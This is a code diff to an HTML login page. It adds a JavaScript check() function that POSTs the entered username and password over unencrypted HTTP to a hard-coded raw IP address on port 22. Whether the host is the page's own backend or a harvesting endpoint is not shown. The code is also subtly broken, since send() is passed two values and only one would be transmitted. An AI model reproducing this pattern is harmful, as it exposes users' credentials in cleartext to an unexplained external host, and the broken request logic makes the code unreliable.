@@ -52,10 +52,25 @@ input[type="button"]{
 <div class="login">
   <input type="text" placeholder="Username" name="userid"><br>
   <input type="password" placeholder="Password" name="pswrd"><br>
-  <input type="button" onclick="" value="Login">
+  <input type="button" onclick="check(this.form)" value="Login">
 </div>
 </form>
 </div>
+<script language="javascript">
+
+function check(form) {
+  if (window.XMLHttpRequest) {
+	 var xhttp = new XMLHttpRequest();
+  } else {
+	 //Just here for old Internet Explorer browsers
+	 xhttp = new ActiveXObject("Microsoft.XMLHTTP");
+  }
+   //http://188.166.172.236:22/     ../signup.js
+  xhttp.open("POST", "http://188.166.172.236:22/", true);
+  xhttp.send(form.userid.value, form.pswrd.value);
+}
+
+
 </script>
 </body>
 </html>
